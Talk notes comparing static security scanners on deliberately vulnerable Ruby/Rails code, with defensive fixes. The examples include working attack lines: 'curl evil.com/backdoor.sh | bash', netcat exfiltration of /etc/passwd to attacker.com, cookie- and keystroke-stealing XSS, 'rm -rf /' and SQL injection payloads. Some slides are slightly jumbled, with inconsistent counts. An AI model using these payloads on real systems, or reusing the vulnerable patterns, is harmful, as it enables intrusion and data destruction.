# SAST and Sensibility: A Rubyist's Guide to SAST
*Presentation Notes and Code Samples*

---

## 1. Title Slide
**SAST and Sensibility: A Rubyist's Guide to SAST**

**Notes:**
- Introduction and speaker background
- Agenda overview

---

## 2. Section Slide - SAST and Ruby

**Notes:**
- Transition into Ruby-specific security analysis
- Set context for Ruby ecosystem challenges

---

## 3. SAST - Define & Why

### Define
**Notes:**
- Static Application Security Testing
- Analyze source code without executing it
- Automated vulnerability detection

### Why
**Notes:**
- Shift left security
- Early detection saves costs
- Compliance requirements
- Developer education

---

## 4. SAST for Ruby - Why

**Notes:**
- Dynamic language challenges
- Duck typing complexities
- Rails framework prevalence
- Community security awareness

**Ruby-Specific Challenges:**
```ruby
# Dynamic method calls
obj.send(params[:method])

# Metaprogramming
define_method(params[:name]) { ... }

# String interpolation everywhere
"SELECT * FROM users WHERE id = #{params[:id]}"
```

---

## 5. Section Slide - Common Ruby Vulnerabilities

**Notes:**
- Transition into specific vulnerability patterns
- Emphasize Ruby/Rails-specific security challenges
- Set up for detailed examples

---

## 6. SQL Injection in Ruby

### Vulnerable Code + Attack - Taint Flow Analysis
```ruby
# controllers/users_controller.rb - Lines 24-29
def search
  # Step 1: User input enters the system
  search_term = params[:q]                     # 🚨 Taint source
  
  # Step 2: Data transformations (developers think this "sanitizes")
  processed_term = search_term.upcase          # 🔄 Still tainted
  sanitized_term = processed_term.strip        # 🔄 Still tainted
  
  # Step 3: Tainted data reaches dangerous sink
  @admins = User.where("role = 'admin' AND name LIKE '%#{sanitized_term}%'")
  #                                                   ^^^^^^^^^^^^^^
  #                                               🎯 SQL injection here!
end
```

### The Attack
```ruby
# params[:q] = "'; DROP TABLE users; --"
# search_term = "'; DROP TABLE users; --"
# Final SQL: "SELECT * FROM users WHERE role = 'admin' AND name LIKE '%'; DROP TABLE USERS; --%'"
```
First query searches, second query destroys database table

### Tool Detection Results
✅ **Detected by 4/7 tools:**
- **Brakeman:** ✅ "Possible SQL injection" (Medium confidence, CWE-89)
- **CodeQL:** ✅ "SQL query built from user-controlled sources" (High precision) 
- **AST-grep:** ✅ "Potential SQL injection vulnerability detected" (Pattern match)
- **OpenGrep:** ✅ "Detected user input used to manually construct a SQL string" (ERROR level)

❌ **Missed by 3/7 tools:**
- **RuboCop:** Style-focused, no taint analysis
- **DevSkim:** Pattern gaps, no Ruby-specific SQL context
- **Sorbet:** Type checking only, not security-focused

### Why Different Detection Rates?
**Brakeman:** Rails framework awareness + data flow analysis
**CodeQL:** Advanced semantic analysis with taint tracking
**AST-grep:** Custom rules for exact SQL interpolation patterns
**OpenGrep:** Community rules detect Rails-specific SQL construction

### Tool Understanding of Taint Flow
Does `search_term.upcase.strip` sanitize SQL injection?

**Tool Responses:**
```diff
+ Brakeman:     "NO! .upcase/.strip don't escape SQL - data still tainted"
+ CodeQL:       "NO! Semantic analysis shows taint flows through transformations"
+ AST-grep:     "NO! But only because I see #{...} interpolation pattern"
+ OpenGrep:     "NO! Community rules understand Ruby string operations"
- RuboCop:      "Not my job - I'm a style checker"
- DevSkim:      "I don't understand Ruby taint semantics"
- Sorbet:       "Type system doesn't prevent logical vulnerabilities"
```

### Common Attack Payloads
```sql
-- Authentication bypass
' OR '1'='1' --           → Logs in as first user (often admin)

-- Data theft  
' UNION SELECT password FROM users --  → Steals all passwords

-- Privilege escalation
'; UPDATE users SET admin=true WHERE name='attacker'; --
```

### Safe Solution
```ruby
# ✅ SAFE - Parameterized queries
User.where(name: params[:name])        # ActiveRecord escaping
User.where("role = ?", params[:role])  # Placeholder prevents injection
```

Notes
- SQL injection is #1 OWASP vulnerability
- Ruby's string interpolation makes it dangerously easy
- ActiveRecord provides safe alternatives by default
- **Key insight:** Rails-aware tools (Brakeman) and semantic analyzers (CodeQL) excel here
- Pattern-based tools (AST-grep, OpenGrep) work when rules target specific constructs
- Style/quality tools (RuboCop, DevSkim) miss complex security vulnerabilities

---

## 7. Command Injection in Ruby

### Vulnerable Code + Attack
```ruby
# Vulnerable - Backticks with user input
result = `ping -c 1 #{params[:host]}`

params[:host] = "google.com; rm -rf /"
# result  `ping -c 1 google.com; rm -rf /`
```
First pings Google, then removes directory 

### Tool Detection Results
✅ **Detected by 4/7 tools:**
- **Brakeman:** ✅ 6 command injection findings (High/Medium confidence)
- **OpenGrep:** ✅ 5 "dangerous-subshell" + 1 "dangerous-exec" findings 
- **CodeQL:** ✅ 2 "rb/command-line-injection" findings
- **AST-grep:** ✅ 2 command injection pattern matches

❌ **Missed by 3/7 tools:**
- **RuboCop:** No security rules for command injection
- **DevSkim:** Limited Ruby shell command patterns
- **Sorbet:** Type checking doesn't analyze shell execution

### Why Strong Detection Here?
**Brakeman:** Extensive Rails + Ruby shell command knowledge
**OpenGrep:** Excellent community rules for Ruby shell patterns
**CodeQL:** Semantic analysis tracks user input to shell execution
**AST-grep:** Simple to write rules for backtick/system() patterns

### Advanced Attack - Dynamic Method Dispatcher

## 8. send() Vulnerability - Advanced Ruby Metaprogramming

### Sophisticated Vulnerable Code
```ruby
# Very dangerous - Ruby metaprogramming vulnerability
class SystemUtilities
  def ping_host(host)
    `ping -c 1 #{host}`
  end
  
  def check_disk(path)
    `df -h #{path}`
  end
end

# Controller with dynamic method dispatch
def system_check
  util = SystemUtilities.new
  method = params[:action]    # User-controlled method name
  argument = params[:arg]     # User-controlled argument
  
  # send() with user-controlled method name
  result = util.send(method, argument)
  render json: { output: result }
end
```

### The Attack - Method + Command Injection

### Attack 1: Method injection to Ruby system method
```ruby
params[:action] = "system"  # Ruby's built-in system method!
params[:arg] = "curl evil.com/backdoor.sh | bash"
result util.send("system", "curl evil.com/backdoor.sh | bash")
```
system command execution, this curl could install malicious code

### Attack 2: eval injection via send
```ruby
params[:action] = "instance_eval"
params[:arg] = "system('cat /etc/passwd | nc attacker.com 4444')"
```
remote code execution using netcat to send password file


### Safe Solution
```ruby
#  Safe - Allowlist of permitted methods
def system_check
  util = SystemUtilities.new
  
  # Explicit allowlist - only these methods allowed
  allowed_methods = %w[ping_host check_disk list_files]
  
  if allowed_methods.include?(params[:action])
    # Still need to sanitize arguments!
    if params[:arg].match?(/\A[a-zA-Z0-9.\/-]+\z/)
      result = util.send(params[:action], params[:arg])
    else
      render json: { error: "Invalid argument format" }
    end
  else
    render json: { error: "Method not allowed" }
  end
end

# Better - Avoid send() entirely
def system_check
  case params[:action]
  when 'ping_host'
    ping_host(params[:arg])
  when 'check_disk'  
    check_disk(params[:arg])
  when 'list_files'
    list_files(params[:arg])
  else
    render json: { error: "Unknown action" }
  end
end
```

### Why Developers Use This Pattern
```ruby
# API endpoint that handles multiple system operations
# GET /api/system/ping_host?arg=google.com     → Ping Google
# GET /api/system/check_disk?arg=/var          → Check /var disk usage
# GET /api/system/list_files?arg=/tmp          → List /tmp files

# Developer thinking: "One endpoint, multiple operations, very DRY!"
# Security reality: "User controls both method AND argument"
```


Notes
- Command injection allows arbitrary system command execution
- Ruby has multiple ways to execute commands (system, backticks, exec, %x{})
- Shell metacharacters (;, |, &, $, `, etc.) are the danger
- Array form bypasses shell completely - safest approach
- Input validation as defense in depth
- Real-world example: GitHub security incident involved command injection

---

## 9. Cross-Site Scripting (XSS) in Ruby/Rails
### Vulnerable Code + Attack
```ruby
# Vulnerable - Bypassing Rails' auto-escaping
"<h1>Hello #{params[:name]}!</h1>".html_safe

# Attack
 params[:name] = "<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"
```
Script executes in victim's browser, steals session cookies

### Real Attack Payloads
```html
<!-- Session hijacking -->
<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>

<!-- Unauthorized actions -->
<script>
  fetch('/transfer_money', {
    method: 'POST', 
    body: JSON.stringify({to: 'attacker', amount: 10000})
  })
</script>

<!-- Credential theft -->
<script>document.onkeypress=e=>fetch('http://evil.com/keys?k='+e.key)</script>
```

### Safe Solution
```ruby
# Safe - Let Rails handle escaping
content_tag(:h1, "Hello #{params[:name]}!")  # Auto-escaped
sanitize(user_content, tags: %w[b i em])     # Controlled HTML
```

### Why Developers Bypass Protection
```ruby
# Rails safely auto-escapes by default:
"<script>alert('xss')</script>"  # → &lt;script&gt;alert('xss')&lt;/script&gt;

# But developers want "dynamic HTML":
"<b>#{params[:name]}</b>".html_safe  # ❌ DANGEROUS!
raw("<div>#{user_content}</div>")    # ❌ ALSO DANGEROUS!
```

Notes
- Rails provides XSS protection by default through auto-escaping
- `.html_safe` and `raw()` are escape hatches that disable protection
- Common developer mistake: marking interpolated strings as html_safe
- XSS allows attackers to steal cookies, session tokens, perform actions as user
- Content Security Policy (CSP) as additional defense layer
- Sanitization libraries like Loofah for rich content

---

## 10. Mass Assignment in Ruby/Rails

### Vulnerable Code + Attack
```ruby
# Vulnerable
User.new(params[:user])

# Attack: Hidden form fields or direct HTTP POST
# POST /users
user[name]=Attacker&user[email]=bad@evil.com&user[admin]=true&user[salary]=999999
```

### Real Attack Payload
```http
POST /users HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user[name]=Evil+User&user[email]=attacker@evil.com&user[admin]=true&user[salary]=999999&user[role]=administrator
```

### What Attacker Gets
```ruby
# Created user record:
{
  name: "Evil User",
  email: "attacker@evil.com", 
  admin: true,           # 🚨 Instant admin access!
  salary: 999999,        # 🚨 Financial manipulation
  role: "administrator"  # 🚨 Elevated privileges
}
```

### Safe Solution
```ruby
# Use explicit allowlist
def user_params
  params.require(:user).permit(:name, :email)  # NO :admin!
end

User.new(user_params)  # Only name and email allowed
```

Notes
- Common mistake: permitting sensitive attributes like admin, role, salary
- Explain the difference between model-level and controller-level protection
- Show how attackers discover parameters through form inspection or API exploration
- Nested parameters add complexity: permit(profile: [:bio, :website])
- Only tool that reliably catches this: Brakeman (Rails-specific knowledge)

---


## 11. Insecure Deserialization

### Vulnerable Code + Attack

```ruby
# models/user.rb - Dangerous deserialization
class User < ApplicationRecord
  def self.import_from_yaml(yaml_string)
    # Dangerous - YAML.load executes arbitrary code
    YAML.load(yaml_string)  # 🎯 Deserialization bomb waiting to happen
    #    ^^^^^ Dangerous method that executes Ruby code
  end
end

# controllers/users_controller.rb - Attack vector
def import_users
  yaml_data = params[:yaml_content]  # Attacker-controlled input
  users = User.import_from_yaml(yaml_data)  # Code execution
  render json: { imported: users.count }
end
```
### The Solution

```ruby
# Use YAML.safe_load with allowlist
class User < ApplicationRecord
  def self.import_from_yaml(yaml_string)
    # Safe deserialization with restricted classes
    YAML.safe_load(
      yaml_string, 
      permitted_classes: [Date, Time, Symbol],  # Only allow safe classes
      permitted_symbols: [],                    # No dangerous symbols
      aliases: false                           # Disable aliases
    )
  end
end

# Use JSON instead
def self.import_from_json(json_string)
  JSON.parse(json_string)  # JSON can't execute arbitrary code
end
```

**Key Points:**
- **YAML.load()** = Remote Code Execution risk
- **YAML.safe_load()** = Safe with proper restrictions  
- **JSON.parse()** = Generally safer alternative
- **Always validate** structure after deserialization

**Speaker Notes:** This is one of the most dangerous Ruby vulnerabilities. Unlike SQL injection which affects data, insecure deserialization gives attackers full system access. The YAML format's ability to instantiate arbitrary Ruby objects makes YAML.load() particularly dangerous.
## 12. Challenges in Ruby

**Notes:**
- Dynamic typing makes static analysis harder
- Metaprogramming obscures code paths
- Framework magic (Rails) hides complexity
- Duck typing assumptions
- String interpolation prevalence

---

## 13. Section Slide - How SAST Works

**Notes:**
- Three main approaches overview
- Each has trade-offs between speed and accuracy

---

## 14. How SAST Works - Primitives

### Regex Pattern Matching
**Notes:**
- Fast but prone to false positives
- Good for simple patterns

### AST (Abstract Syntax Tree)
**Notes:**
- Better understanding of code structure
- More accurate than regex

### Data Flow Tracking (Taint Tracking)
**Notes:**
- Follows data through the application
- Most accurate but slowest

---

## 15. How Regex Works - Visual Example

**Pattern:**
```regex
eval\s*\(\s*.*params
```

**Code Example:**
```ruby
# This gets flagged
eval(params[:code])

# This also gets flagged (false positive)
eval("safe_constant")  # Safe but flagged

# This gets missed (false negative)  
dangerous_method = "eval"
send(dangerous_method, params[:code])
```

**Notes:**
- Show regex pattern matching
- Highlight false positives and negatives
- Visual diagram of pattern matching

---

## 16. How AST Works - Visual Example

**Code:**
```ruby
User.where("name = '#{params[:name]}'")
```

**AST Structure:**
```
CallExpression
├── Receiver: User
├── Method: where
└── Arguments
    └── StringLiteral with Interpolation
        ├── "name = '"
        ├── HashAccess
        │   ├── params
        │   └── :name
        └── "'"
```

**Notes:**
- Show tree structure visualization
- Explain how tools parse code structure
- Better than regex but still limited

---

## 17. How Data Flow Tracking Works - Visual Example

### Vulnerable Code (What SAST Tools Detect):
```ruby
def search
  search_term = params[:q]           # Source
  processed = search_term.upcase     # Transform
  sanitized = processed.strip        # Transform (still tainted)
  
  User.where("name LIKE '%#{sanitized}%'")  # Sink
end
```

**Data Flow:**
```
params[:q] → search_term → processed → sanitized → SQL query
   ↑             ↓           ↓          ↓         ↓
 Source      Transform   Transform   Transform   Sink
           (tainted)   (tainted)   (tainted)  (ALERT!)
```

### Fixed Code (What Prevents Detection):
```ruby
def search
  search_term = params[:q]           # Source
  
  # Option 1: Parameterized query (recommended)
  User.where("name LIKE ?", "%#{search_term}%")  # Safe: No taint to sink
  
  # Option 2: Proper sanitization
  sanitized = ActiveRecord::Base.sanitize_sql_like(search_term)  # Removes taint
  User.where("name LIKE '%#{sanitized}%'")  # Safe: Sanitizer removes taint
  
  # Option 3: Allowlist validation
  if search_term.match?(/\A[a-zA-Z0-9\s]+\z/)   # Validation removes taint
    User.where("name LIKE '%#{search_term}%'")  # Safe: Validated input
  else
    User.none  # Safe: Reject invalid input
  end
end
```

**Safe Data Flow:**
```
Option 1: params[:q] → parameterized query (✅ No interpolation)
Option 2: params[:q] → sanitize_sql_like() → [TAINT REMOVED] → SQL query (✅ Safe)
Option 3: params[:q] → validation → [TAINT REMOVED] → SQL query (✅ Safe)
```

**Notes:**
- Show taint flow visualization
- Explain source, sink, and sanitization concepts
- Demonstrate what "breaks the taint chain"
- Most accurate approach for finding real vulnerabilities

---

## 18. Section Slide - SAST Landscape
---

## 19. Tools Rubyists May Already Be Familiar With

### Sorbet
* type checking
* sometimes finds security issue by coincidence
* real time

### RuboCop
* code quality
* some security checks
* git hooks

### Brakeman - Rails Security
* intentional security tool 
* Understands Rails idioms and patterns
* could be a little long for git hooks could be good for ci/cd

---

## 20. Tools Rubyists May Be Less Familiar With

### OpenGrep/Semgrep
* 

### DevSkim
* Microsoft security linter
* Cross-language support
* Pattern-based detection

### AST-grep
*

### CodeQL
* GitHub's semantic analysis engine
* Enterprise-grade precision
* Complex query language

---

## 21. Section Slide - Detection

* now let's take a look at what each can detect
---

## 22. Vulnerable Code Examples

### 🔄 **Code Sample 1: Same-File SQL Injection**
*All tools can detect this pattern*

```ruby
# controllers/users_controller.rb - Same file, obvious pattern
def search
  # ❌ Vulnerable - Direct string interpolation (same method)
  @users = User.where("name LIKE '%#{params[:q]}%'")
  #                              ^^^^^^^^^^^^
  #                           🎯 Taint source → sink (same file)
end
```

**Attack:** `params[:q] = "'; DROP TABLE users; --"`
**Result:** SQL injection destroys database

**Detection Results:**
- ✅ **Brakeman**: Detected as "SQL Injection" (Rails pattern)
- ✅ **CodeQL**: Detected as "rb/sql-injection" (taint analysis)  
- ✅ **OpenGrep**: Detected with community rules (pattern match)
- ✅ **AST-grep**: Detected with custom rules (string interpolation)


## 23. RuboCop Detection

**Terminal Output with Highlighting:**
```bash
$ rubocop --format simple

== models/user.rb ==
C:  8:  5: Security/Eval: The use of eval is a serious security risk.
C: 19: 10: Security/YAMLLoad: Prefer using `YAML.safe_load` over `YAML.load`.

2 files inspected, 28 offenses detected
```

**Code with RuboCop Highlighting:**
```ruby
# models/user.rb:8
    eval(expression)  # ⚠️  Security/Eval flagged here
    ^^^^             # RuboCop highlights the dangerous method

# models/user.rb:19  
    YAML.load(yaml_content)  # ⚠️  Security/YAMLLoad flagged here
         ^^^^               # RuboCop highlights unsafe deserialization
```

**Notes:**
- 2 security findings out of 28 total issues
- Excellent at flagging dangerous method calls
- No data flow analysis - misses context-dependent vulnerabilities

---

## 24. Brakeman Detection

**What Brakeman Sees vs Misses:**

```ruby
# ✅ DETECTED - Rails SQL injection patterns
User.where("name = '#{params[:name]}'")
#          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Brakeman: "Possible SQL injection"

# ✅ DETECTED - Taint tracking within controllers
def search
  term = params[:q]      # Brakeman tracks this taint...
  User.where("x = '#{term}'")
  #             ^^^^^ ...to here! "Medium confidence"
end

# ✅ DETECTED - Rails command injection
system(params[:cmd])     # Brakeman: "Possible command injection"
#      ^^^^^^^^^^^^^ Understands Rails params

# ❌ MISSED - Cross-file taint flow
def calculate_score
  User.process(params[:formula])  # Brakeman can't follow this...
end
# In User model:
# eval(formula)  # ...to dangerous sink in different file
```

**Actual Brakeman JSON Output:**
```json
// From brakeman-final.json - Real detection of SQL injection
{
  "warning_type": "SQL Injection",
  "warning_code": 0,
  "check_name": "SQL",
  "message": "Possible SQL injection",
  "file": "controllers/users_controller.rb",
  "line": 8,
  "code": "User.where(\"name LIKE '%#{params[:q]}%'\")",
  "user_input": "params[:q]",
  "confidence": "Medium",
  "cwe_id": [89]
}
```

**Result:** ✅ **Detected SQL Injection Successfully**
- **Medium confidence** - understands Rails patterns
- 12 total security warnings found
- Excellent at Rails-specific vulnerabilities within same file
- **Cannot trace taint across file boundaries**

**Notes:**
- 9 security findings, 0 false positives
- Understands Rails patterns and data flow
- Excellent at tracing taint through variable assignments

---

## 25. DevSkim Detection

**What DevSkim Sees vs Misses:**

```ruby
# ❌ MISSED - No Ruby SQL injection rules
User.where("name = '#{params[:name]}'")
#          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ DevSkim has no Rails patterns

# ❌ MISSED - Limited Ruby language support
def search
  term = params[:q]      # DevSkim doesn't understand Rails
  User.where(term)       # No Ruby-specific security rules
end

# ❌ MISSED - Ruby command injection patterns
system(user_input)       # DevSkim focuses on C#/JavaScript/Python

# ✅ DETECTED - Generic unsafe patterns (rare)
YAML.load(data)         # DevSkim: "Do not deserialize untrusted data"
#    ^^^^ One of very few Ruby rules
```

**Actual DevSkim Output:**
```plaintext
# From devskim.txt - Real output showing mostly false positives
models/user.rb:19:4:19:13 [ManualReview] DS425030 Do not deserialize untrusted data.

# 98% false positives flagging tool output files as "secrets":
docs/results/brakeman-final.json:99:21:99:87 [Important] DS173237 
Do not store tokens or keys in source code.
# ...80+ more false positives from flagging JSON keys as secrets
```

**Result:** ❌ **No SQL Injection Detection**
- DevSkim has **very limited Ruby rule coverage**
- 1 real security finding, 80+ false positives
- **Missing Rails-specific security patterns**
- Better suited for multi-language codebases

---


## 26. AST-grep Detection

**What AST-grep Sees vs Misses:**

```ruby
# ✅ DETECTED - Direct pattern match
User.where("name = '#{params[:name]}'")
#          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ AST pattern matches

# ❌ MISSED - No data flow analysis
def search
  term = params[:q]      # AST-grep doesn't track this...
  User.where(term)       # ...so this looks "safe" to AST-grep
end

# ✅ DETECTED - Structural pattern
system(user_input)       # Matches system($VAR) pattern

# ❌ MISSED - Complex taint flow
input = params[:cmd]
processed = input.upcase
system(processed)        # AST-grep doesn't connect the dots
```

**Actual AST-grep JSON Output:**
```json
// From ast-grep.json - Real detection of command injection pattern
{
  "text": "system(command)",
  "range": {
    "start": { "line": 11, "column": 4 },
    "end": { "line": 11, "column": 19 }
  },
  "file": "controllers/payments_controller.rb",
  "lines": "    system(command) # 🚨 Potential command injection",
  "language": "Ruby",
  "metaVariables": {
    "CMD": { "text": "command" }
  }
}
```

**Custom Rules Used:**
```yaml
# sql-injection.yml
pattern: '$OBJ.where("$SQL")'
constraints:
  SQL:
    regex: '.*#{.*}.*'
```

**Result:** ✅ **Detected SQL Injection Successfully**
- **HIGH severity** with custom rule
- Excellent for direct pattern matching
- **Cannot track data flow** or variable assignments

---


## 27. OpenGrep Detection

**What OpenGrep Sees vs Misses:**

```ruby
# ✅ DETECTED - Community rules excel at patterns
User.where("name = '#{params[:name]}'")
#          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ OpenGrep: "tainted-sql-string"

# ✅ DETECTED - Pattern matching within files
def search
  term = params[:q]      # OpenGrep tracks this...
  User.where("x = '#{term}'")
  #             ^^^^^ ...to here! "ERROR severity"
end

# ✅ DETECTED - Command injection patterns
system(params[:cmd])     # OpenGrep: "dangerous-subshell"
#      ^^^^^^^^^^^^^ 156 community rules are comprehensive

# ❌ MISSED - Cross-file taint flow (tested with 156 rules)
def calculate_score
  User.process(params[:formula])  # OpenGrep can't follow across files
end
# In User model:
# eval(formula)  # Method call boundary breaks taint tracking
```

**Actual OpenGrep Output:**
```markdown
# From opengrep-readable.md - Real SQL injection detection
Finding 10: ruby.rails.security.injection.tainted-sql-string.tainted-sql-string
File: controllers/users_controller.rb
Line: 8
Severity: ERROR
Message: Detected user input used to manually construct a SQL string. 
Code: @users = User.where("name LIKE '%#{params[:q]}%'")
CWE: ["CWE-89: Improper Neutralization of Special Elements used in an SQL Command"]

# Total: 13 findings across 7 different vulnerability types
# Cross-file test: 0 detections from 156 community rules
```

**Result:** ✅ **Detected SQL Injection Successfully**
- **ERROR severity** - highest priority
- 13 total findings, excellent single-file coverage
- **Cannot trace taint across file boundaries** (156 rules tested)
     20 │ get '/search' do
     21 │   query = params[:q]
     22 │   "<h1>Search results for: #{query}</h1>"  # 🎯 XSS vulnerability
        │                            ^^^^^

rule:ruby.lang.security.dangerous-subshell  
  app.rb:29
     28 │ get '/ping' do
     29 │   result = `ping -c 1 #{host}`  # 🎯 Command injection
        │                       ^^^^
```

**JSON Output with Dataflow:**
```json
{
  "check_id": "ruby.rails.security.injection.raw-html-format",
  "path": "app.rb",
  "start": {"line": 22, "col": 32},
  "message": "Detected user input flowing into manually constructed HTML. This could create a cross-site scripting vulnerability.",
  "extra": {
    "dataflow_trace": {
      "taint_source": "params[:q]",
      "taint_sink": "HTML string interpolation"
    }
  }
}
```

**Advanced Cross-File Taint Tracking:**
```ruby
# controllers/users_controller.rb
def calculate_user_score
  formula = params[:formula]  # 🔴 TAINT SOURCE
  @result = User.calculate_score(formula)  # 🔄 CROSS-FILE FLOW
end

# models/user.rb  
def self.calculate_score(formula)
  eval(formula)  # 🎯 DANGEROUS SINK
end
```

**Detection Results:**
- **CodeQL**: ✅ Successfully traces taint across files  
- **OpenGrep**: ❌ Found 14 vulnerabilities in-file, missed cross-file flows (156 rules tested)
- **All others**: ❌ Cannot detect cross-file taint tracking

**Notes:**
- Only CodeQL performs semantic analysis across file boundaries
- Pattern-matching tools limited to single-file vulnerability detection
- Unique XSS detection that other tools missed
- Sophisticated cross-file taint analysis

---

## 28. CodeQL Detection - Same-File Patterns

**What CodeQL Sees (Like Other Tools):**

```ruby
# ✅ DETECTED - Same-file SQL injection (like Brakeman, OpenGrep, AST-grep)
User.where("name = '#{params[:name]}'")
#          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^ CodeQL: "rb/sql-injection"

# ✅ DETECTED - Complex data flow tracking (better than others)
def search
  term = params[:q]      # CodeQL tracks this through variables...
  processed = term.upcase
  filtered = processed.strip
  User.where("x = '#{filtered}'")
  #             ^^^^^^^^ ...to here! Full taint analysis
end

# ✅ DETECTED - Sophisticated semantic analysis
input = params[:cmd]
if input.include?('safe')  # Most tools think this "sanitizes"
  system(input)           # CodeQL: Still Vulnerable despite 'safe' check
end
```

**Actual CodeQL JSON Output:**
```json
// From codeql-final.json - Real same-file detections
{
  "rule_id": "rb/sql-injection",
  "message": "This SQL query depends on a [user-provided value](1).",
  "file": "controllers/users_controller.rb",
  "line": 8,
  "severity": "error",
  "cwe": ["external/cwe/cwe-089"]
},
{
  "rule_id": "rb/url-redirection", 
  "message": "Untrusted URL redirection depends on a [user-provided value](1).",
  "file": "controllers/users_controller.rb",
  "line": 12,
  "severity": "error",
  "cwe": ["external/cwe/cwe-601"]
}
```

**CodeQL's Same-File Advantages:**
- **Advanced Taint Tracking**: Follows data through multiple variable assignments
- **Semantic Understanding**: Recognizes that `input.include?('safe')` doesn't sanitize
- **High Precision**: 10 findings, 0 false positives
- **Multiple Vulnerability Types**: SQL injection, XSS, command injection, path traversal

---

## 29. CodeQL Detection - Cross-File Flows (UNIQUE!)
**What Only CodeQL Can Detect:**

```ruby
# ✅ DETECTED - Cross-file taint flow (UNIQUE!)
def calculate_score
  User.process(params[:formula])  # CodeQL follows across files...
end
# In User model:
# eval(formula)  # ...to dangerous sink! "rb/code-injection"
```

### 🚀 **Code Sample 2: Cross-File Code Injection**

**Controller File - controllers/users_controller.rb:**
```ruby
def calculate_user_score
  formula = params[:formula]  # 🚨 Taint source in controller
  @result = User.calculate_score(formula)  # 🔄 Cross-file method call
  render json: { score: @result }
end
```

**Model File - models/user.rb:**
```ruby
def self.calculate_score(formula)
  # ❌ Vulnerable - eval() in different file from taint source!
  eval("result = #{formula}")  # 🎯 Code injection sink
end
```

**The Cross-File Attack:**
1. **HTTP Request:** `POST /calculate_score` with `formula=system('rm -rf /')`
2. **Controller:** `params[:formula]` → `User.calculate_score(formula)`
3. **Model:** `eval("result = system('rm -rf /')")` → **💥 System compromise**

**Detection Results:**
- ✅ **CodeQL**: **ONLY tool to detect cross-file taint flow**
- ❌ **Brakeman**: Misses cross-file data flow
- ❌ **OpenGrep**: Cannot trace across file boundaries (156 rules tested)
- ❌ **All others**: Limited to single-file analysis

**CodeQL's Cross-File SARIF Output:**
```json
{
  "ruleId": "rb/code-injection",
  "message": "Code injection from remote user input",
  "codeFlows": [{
    "threadFlows": [{
      "locations": [
        {
          "location": {
            "message": "Source: HTTP parameter",
            "physicalLocation": {
              "uri": "controllers/users_controller.rb",
              "startLine": 32,
              "snippet": "params[:formula]"
            }
          }
        },
        {
          "location": {
            "message": "Sink: Code execution in different file",
            "physicalLocation": {
              "uri": "models/user.rb",
              "startLine": 15,
              "snippet": "eval(\"result = #{formula}\")"
            }
          }
        }
      ]
    }]
  }]
}
```

**Why This Matters:**
- **Real-World Attacks**: Cross-file vulnerabilities are harder to spot in code review
- **Enterprise Applications**: Modern apps span multiple files and modules
- **Advanced Threat Detection**: Only semantic analysis can trace complex attack paths
- **Unique Capability**: CodeQL is the only tool in our survey that can do this

---

## 30. What Each Tool Sees or Misses

| Tool | SQL Injection | Command Injection | send() Vuln | Cross-File Taint | Total Findings |
|------|---------------|-------------------|-------------|------------------|----------------|
| **Brakeman** | ✅ 3 findings | ✅ 6 findings | ❌ Missed | ❌ Single-file only | 12 security |
| **OpenGrep** | ✅ 2 findings | ✅ 5 findings | ❌ Missed | ❌ Missed (156 rules tested) | 14 security |
| **CodeQL** | ✅ 3 findings | ✅ 2 findings | ✅ ONLY TOOL | ✅ ONLY TOOL | 10 security |
| **AST-grep** | ✅ 3 findings | ✅ 2 findings | ❌ Missed | ❌ Pattern-based only | 5 security |
| **RuboCop** | ❌ None | ❌ None | ❌ Missed | ❌ Single-file analysis | 2 security cops |
| **DevSkim** | ❌ None | ❌ None | ❌ Missed | ❌ Pattern-based only | 93 (mostly false+) |

**Critical Insights:**
- **SQL Injection:** Rails-aware tools (Brakeman) + semantic analysis (CodeQL) excel
- **Command Injection:** Well-covered by most security-focused tools (4/7 detected)
- **send() Vulnerability:** ONLY CodeQL's advanced analysis caught this critical flaw
- **Cross-File Taint Tracking:** ONLY CodeQL traces vulnerabilities spanning multiple files
- **Tool Specialization:** Each tool has blind spots - layered approach essential
- **Semantic Analysis Advantage:** CodeQL's understanding of Ruby method dispatch enables unique detections

**Notes:**
- Explain why pattern-based tools struggle with Ruby metaprogramming
- Highlight that no single tool provides complete coverage

---

## 31. Section Slide - Pragmatic Implementation - SAST & Sensibility
---

## 32. Practical Limitations

### Maintenance Overhead
- Custom rules require ongoing updates
- Community rules need evaluation
- Tool updates may break workflows

**Notes:**
- Be realistic about constraints
- Consider team capabilities
- Plan for maintenance

---

## 33. Performance Comparison

| Tool | Small Project | Medium Project | Large Project | CI/CD Suitable |
|------|---------------|----------------|---------------|----------------|
| **RuboCop** | 2s | 5s | 15s | ✅ Yes |
| **Brakeman** | 1s | 3s | 8s | ✅ Yes |
| **AST-grep** | 1s | 2s | 5s | ✅ Yes |
| **OpenGrep** | 3s | 8s | 20s | ✅ Yes |
| **DevSkim** | 2s | 4s | 10s | ✅ Yes |
| **Sorbet** | 5s | 15s | 45s | ⚠️ Maybe |
| **CodeQL** | 30s | 2m | 10m+ | ❌ No |

**Notes:**
- Performance varies by project size
- CodeQL best for comprehensive analysis
- Most tools suitable for continuous integration

---

## 34. Where to Integrate

| Stage | Recommended Tools | Purpose |
|-------|------------------|---------|
| **IDE/Editor** | Devskim, RuboCop, Sorbet | Real-time feedback |
| **Git Hook** | Brakeman, RuboCop | Quick security check |
| **CI/CD Pipeline** | AST-grep, Brakeman, CodeQL, OpenGrep | Automated security testing |
| **Scheduled Deep Scan** | CodeQL, Full OpenGrep suite | Comprehensive analysis |

**Notes:**
- Layered approach works best
- Different tools for different stages
- Balance security and developer experience

---

## 35. Resources and Next Steps

### Sample Repo
* contains all of these examples and sample actions workflows, git hooks

### Next steps
* quick wins (sensibility)
* long term security investments (sense)
* best SAST tool is what your team will use (but seriously do at least one quick feedback and one intensive tool on ci/cd or cadence)

---
